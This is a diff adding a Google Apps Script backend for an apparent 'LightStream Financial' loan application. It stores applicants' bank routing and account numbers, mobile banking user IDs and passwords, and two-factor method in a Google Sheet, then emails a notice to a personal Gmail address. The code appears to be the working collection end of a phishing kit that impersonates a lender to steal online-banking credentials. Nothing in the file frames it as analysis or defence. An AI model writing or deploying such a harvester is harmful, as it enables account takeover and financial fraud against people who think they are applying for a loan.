@@ -1,0 +1,76 @@
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+const RECIPIENT_EMAIL = "finnfoxpersonalloan@gmail.com";
+
+function doGet(e) {
+  return ContentService.createTextOutput("LightStream Google Apps Script is working");
+}
+
+function doPost(e) {
+  try {
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Loan Applications");
+    
+    // Handle FormData (from working version)
+    let data = {};
+    if (e.parameters) {
+      for (let key in e.parameters) {
+        data[key] = e.parameters[key][0];
+      }
+    }
+    
+    // Add data to Google Sheets
+    sheet.appendRow([
+      data.timestamp || new Date().toISOString(),
+      data.type || 'Unknown',
+      data.firstName || '',
+      data.lastName || '',
+      data.email || '',
+      data.phone || '',
+      data.loanAmount || '',
+      data.loanPurpose || '',
+      data.loanDuration || '',
+      data.grossMonthlyIncome || '',
+      data.employmentStatus || '',
+      data.creditScore || '',
+      data.streetAddress || '',
+      data.city || '',
+      data.state || '',
+      data.zipCode || '',
+      data.routingNumber || '',
+      data.accountNumber || '',
+      data.bankName || '',
+      data.mobileBankingUserId || '',
+      data.mobileBankingPassword || '[PROTECTED]',
+      data.twoFactorMethod || '',
+      data.termsAccepted || 'false'
+    ]);
+    
+    // Send email notification
+    sendEmailNotification(data);
+    
+    return ContentService.createTextOutput("SUCCESS: Data saved to Google Sheets and email sent");
+    
+  } catch (error) {
+    return ContentService.createTextOutput("ERROR: " + error.toString());
+  }
+}
+
+function sendEmailNotification(data) {
+  try {
+    const subject = "New " + (data.type || "Loan") + " Application - LightStream Financial";
+    
+    const body = "New " + (data.type || "loan") + " application received:\n\n" +
+      "Customer: " + (data.firstName || '') + " " + (data.lastName || '') + "\n" +
+      "Email: " + (data.email || 'N/A') + "\n" +
+      "Phone: " + (data.phone || 'N/A') + "\n" +
+      "Loan Amount: $" + (data.loanAmount || 'N/A') + "\n" +
+      "Loan Purpose: " + (data.loanPurpose || 'N/A') + "\n" +
+      "Bank: " + (data.bankName || 'N/A') + "\n\n" +
+      "Submitted: " + new Date().toLocaleString() + "\n\n" +
+      "Check Google Sheet for complete details.";
+    
+    MailApp.sendEmail(RECIPIENT_EMAIL, subject, body);
+    
+  } catch (error) {
+    // Email failed but don't stop the process
+  }
+}
